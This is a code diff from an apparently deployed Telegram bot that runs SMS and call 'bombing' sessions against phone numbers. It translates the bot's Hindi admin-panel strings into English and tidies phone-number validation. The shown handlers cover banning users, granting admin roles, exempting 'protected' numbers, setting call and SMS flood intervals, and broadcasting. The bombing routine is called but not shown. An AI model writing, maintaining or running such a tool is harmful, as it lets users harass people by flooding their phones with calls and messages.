         success, msg = await start_bombing_session(user_id, phone, mode, context)
@@ -587,184 +619,185 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states.pop(user_id, None)
         user_temp_data.pop(user_id, None)
 
-    # --- एडमिन बैन ---
+    # Admin Ban
     elif state == STATE_ADMIN_BAN:
         try:
             target = int(text)
             if await ban_user(target):
-                await update.message.reply_text(f"✅ यूजर {target} बैन कर दिया गया।")
+                await update.message.reply_text(f"✅ User {target} banned.")
             else:
-                await update.message.reply_text("❌ यूजर नहीं मिला।")
+                await update.message.reply_text("❌ User not found.")
         except:
-            await update.message.reply_text("अमान्य ID।")
+            await update.message.reply_text("Invalid ID.")
         user_states.pop(user_id, None)
 
-    # --- एडमिन अनबैन ---
+    # Admin Unban
     elif state == STATE_ADMIN_UNBAN:
         try:
             target = int(text)
             if await unban_user(target):
-                await update.message.reply_text(f"✅ यूजर {target} अनबैन कर दिया गया।")
+                await update.message.reply_text(f"✅ User {target} unbanned.")
             else:
-                await update.message.reply_text("❌ यूजर नहीं मिला।")
+                await update.message.reply_text("❌ User not found.")
         except:
-            await update.message.reply_text("अमान्य ID।")
+            await update.message.reply_text("Invalid ID.")
         user_states.pop(user_id, None)
 
-    # --- एडमिन डिलीट ---
+    # Admin Delete
     elif state == STATE_ADMIN_DELETE:
         try:
             target = int(text)
             if await delete_user(target):
-                await update.message.reply_text(f"✅ यूजर {target} डिलीट कर दिया गया।")
+                await update.message.reply_text(f"✅ User {target} deleted.")
             else:
-                await update.message.reply_text("❌ यूजर नहीं मिला।")
+                await update.message.reply_text("❌ User not found.")
         except:
-            await update.message.reply_text("अमान्य ID।")
+            await update.message.reply_text("Invalid ID.")
         user_states.pop(user_id, None)
 
-    # --- एडमिन लुकअप ---
+    # Admin Lookup
     elif state == STATE_ADMIN_LOOKUP:
         try:
             target = int(text)
             u = await get_user_by_id(target)
             if not u:
-                await update.message.reply_text("❌ यूजर नहीं मिला।")
+                await update.message.reply_text("❌ User not found.")
             else:
                 info = (
-                    f"👤 <b>यूजर {target}</b>\n"
-                    f"नाम: {u.get('first_name','?')}\n"
-                    f"यूजरनेम: @{u.get('username','?')}\n"
-                    f"रोल: {u.get('role','user')}\n"
-                    f"बैन: {'हाँ' if u.get('banned') else 'नहीं'}"
+                    f"👤 <b>User {target}</b>\n"
+                    f"Name: {u.get('first_name','?')}\n"
+                    f"Username: @{u.get('username','?')}\n"
+                    f"Role: {u.get('role','user')}\n"
+                    f"Banned: {'Yes' if u.get('banned') else 'No'}"
                 )
                 await update.message.reply_text(info, parse_mode=ParseMode.HTML)
         except:
-            await update.message.reply_text("अमान्य ID।")
+            await update.message.reply_text("Invalid ID.")
         user_states.pop(user_id, None)
 
-    # --- एडमिन बनाएं ---
+    # Admin Add Admin
     elif state == STATE_ADMIN_ADDADMIN:
         try:
             target = int(text)
             await set_admin_role(target, True)
-            await update.message.reply_text(f"✅ {target} अब एडमिन है।")
+            await update.message.reply_text(f"✅ {target} is now an admin.")
         except:
-            await update.message.reply_text("अमान्य ID।")
+            await update.message.reply_text("Invalid ID.")
         user_states.pop(user_id, None)
 
-    # --- एडमिन से हटाएं ---
+    # Admin Remove Admin
     elif state == STATE_ADMIN_REMOVEADMIN:
         try:
             target = int(text)
             await set_admin_role(target, False)
-            await update.message.reply_text(f"✅ {target} अब एडमिन नहीं है।")
+            await update.message.reply_text(f"✅ {target} is no longer an admin.")
         except:
-            await update.message.reply_text("अमान्य ID।")
+            await update.message.reply_text("Invalid ID.")
         user_states.pop(user_id, None)
 
-    # --- प्रोटेक्ट नंबर जोड़ें ---
+    # Protect Number
     elif state == STATE_ADMIN_PROTECT:
-        phone = ''.join(filter(str.isdigit, text))
-        if len(phone) != 10:
-            await update.message.reply_text("❌ 10 अंकों का नंबर भेजें।")
+        cleaned = clean_phone_number(text)
+        if not cleaned:
+            await update.message.reply_text("❌ Invalid number! Send a 10-digit number.")
             return
+        phone = cleaned
         if await add_protected_number(phone, user_id):
-            await update.message.reply_text(f"✅ {phone} प्रोटेक्टेड लिस्ट में जोड़ा गया।")
+            await update.message.reply_text(f"✅ {phone} added to protected list.")
         else:
-            await update.message.reply_text("⚠️ यह नंबर पहले से प्रोटेक्टेड है।")
+            await update.message.reply_text("⚠️ Number already protected.")
         user_states.pop(user_id, None)
 
-    # --- प्रोटेक्शन हटाएं ---
+    # Unprotect Number
     elif state == STATE_ADMIN_UNPROTECT:
-        phone = ''.join(filter(str.isdigit, text))
-        if len(phone) != 10:
-            await update.message.reply_text("❌ 10 अंकों का नंबर भेजें।")
+        cleaned = clean_phone_number(text)
+        if not cleaned:
+            await update.message.reply_text("❌ Invalid number! Send a 10-digit number.")
             return
+        phone = cleaned
         if await remove_protected_number(phone):
-            await update.message.reply_text(f"✅ {phone} की प्रोटेक्शन हटा दी गई।")
+            await update.message.reply_text(f"✅ Protection removed for {phone}.")
         else:
-            await update.message.reply_text("⚠️ यह नंबर प्रोटेक्टेड नहीं है।")
+            await update.message.reply_text("⚠️ Number not protected.")
         user_states.pop(user_id, None)
 
-    # --- कॉल इंटरवल सेट करें ---
+    # Set Call Interval
     elif state == STATE_ADMIN_SET_CALL_INTERVAL:
         try:
             sec = int(text)
             if sec < 5 or sec > 120:
-                await update.message.reply_text("❌ 5 से 120 सेकंड के बीच होना चाहिए।")
+                await update.message.reply_text("❌ Must be between 5 and 120 seconds.")
                 return
             await update_call_interval(sec)
-            await update.message.reply_text(f"✅ कॉल इंटरवल {sec} सेकंड सेट कर दिया गया।")
+            await update.message.reply_text(f"✅ Call interval set to {sec} seconds.")
         except:
-            await update.message.reply_text("अमान्य संख्या।")
+            await update.message.reply_text("Invalid number.")
         user_states.pop(user_id, None)
 
-    # --- SMS इंटरवल सेट करें ---
+    # Set SMS Interval
     elif state == STATE_ADMIN_SET_SMS_INTERVAL:
         try:
             sec = int(text)
             if sec < 2 or sec > 60:
-                await update.message.reply_text("❌ 2 से 60 सेकंड के बीच होना चाहिए।")
+                await update.message.reply_text("❌ Must be between 2 and 60 seconds.")
                 return
             await update_sms_interval(sec)
-            await update.message.reply_text(f"✅ SMS इंटरवल {sec} सेकंड सेट कर दिया गया।")
+            await update.message.reply_text(f"✅ SMS interval set to {sec} seconds.")
         except:
-            await update.message.reply_text("अमान्य संख्या।")
+            await update.message.reply_text("Invalid number.")
         user_states.pop(user_id, None)
 
-    # --- ब्रॉडकास्ट ---
+    # Broadcast
     elif state == STATE_ADMIN_BROADCAST:
         user_ids = await get_all_user_ids()
         if not user_ids:
-            await update.message.reply_text("कोई यूजर नहीं है।")
+            await update.message.reply_text("No users found.")
             user_states.pop(user_id, None)
             return
-        status_msg = await update.message.reply_text(f"📢 {len(user_ids)} यूजर्स को भेज रहे हैं...")
+        status_msg = await update.message.reply_text(f"📢 Sending to {len(user_ids)} users...")
         success = 0
         for uid in user_ids:
             if await send_any_message(context.bot, uid, update, text):
                 success += 1
-        await status_msg.edit_text(f"✅ ब्रॉडकास्ट पूर्ण: {success}/{len(user_ids)} को भेजा गया।")
+        await status_msg.edit_text(f"✅ Broadcast complete: {success}/{len(user_ids)} delivered.")
         user_states.pop(user_id, None)
 
-    # --- डायरेक्ट मैसेज (टारगेट सेट) ---
+    # DM Target
     elif state == STATE_ADMIN_DM_TARGET:
         try:
             target = int(text)
             user_temp_data[user_id] = {"dm_target": target}
             user_states[user_id] = STATE_ADMIN_DM_MESSAGE
             await update.message.reply_text(
-                f"✅ टारगेट: {target}\nअब जो मैसेज भेजना है वह भेजें (मीडिया भी चलेगा)।",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+                f"✅ Target: {target}\nNow send the message (media allowed).",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
             )
         except:
-            await update.message.reply_text("अमान्य ID।")
+            await update.message.reply_text("Invalid ID.")
             user_states.pop(user_id, None)
 
-    # --- डायरेक्ट मैसेज (मैसेज भेजें) ---
+    # DM Send Message
     elif state == STATE_ADMIN_DM_MESSAGE:
         target = user_temp_data.get(user_id, {}).get("dm_target")
         if not target:
-            await update.message.reply_text("कुछ गड़बड़ हो गई।")
+            await update.message.reply_text("Something went wrong.")
             user_states.pop(user_id, None)
             return
         if await send_any_message(context.bot, target, update, text):
-            await update.message.reply_text(f"✅ {target} को मैसेज भेज दिया गया।")
+            await update.message.reply_text(f"✅ Message sent to {target}.")
         else:
-            await update.message.reply_text("❌ मैसेज भेजने में विफल।")
+            await update.message.reply_text("❌ Failed to send message.")
         user_states.pop(user_id, None)
         user_temp_data.pop(user_id, None)
 
-    # --- कोई स्टेट नहीं ---
+    # No state
     else:
-        await update.message.reply_text("कृपया मेनू का उपयोग करें।")
+        await update.message.reply_text("Please use the menu buttons.")
 
 # ------------------------------------------------------------------
-# एप्लिकेशन सेटअप और मेन फंक्शन
+# Application Setup and Main Function
 # ------------------------------------------------------------------
 async def main():
-    # MongoDB कनेक्शन चेक
     try:
         await client.admin.command('ping')
         logger.info("✅ MongoDB connected")
@@ -774,12 +807,12 @@ async def main():
 
     app = Application.builder().token(BOT_TOKEN).rate_limiter(AIORateLimiter()).build()
 
-    # कमांड हैंडलर्स
+    # Command Handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("menu", menu_command))
     app.add_handler(CommandHandler("admin", admin_command))
 
-    # कॉलबैक हैंडलर्स
+    # Callback Handlers
     app.add_handler(CallbackQueryHandler(main_menu_callback, pattern="^main_menu$"))
     app.add_handler(CallbackQueryHandler(choose_mode_callback, pattern="^choose_mode$"))
     app.add_handler(CallbackQueryHandler(mode_selected_callback, pattern="^mode_(call|sms|both)$"))
@@ -804,13 +837,13 @@ async def main():
     app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
     app.add_handler(CallbackQueryHandler(admin_dm_callback, pattern="^admin_dm$"))
 
-    # मैसेज हैंडलर (सभी टेक्स्ट/मीडिया)
+    # Message Handler
     app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))
 
-    # सेल्फ-पिंग शुरू करें
+    # Start self-ping
     asyncio.create_task(keep_alive())
 
-    # वेबहुक शुरू करें
+    # Start webhook
     if RENDER_EXTERNAL_URL:
         webhook_url = f"{RENDER_EXTERNAL_URL}/webhook"
         logger.info(f"🚀 Webhook starting on {webhook_url}")
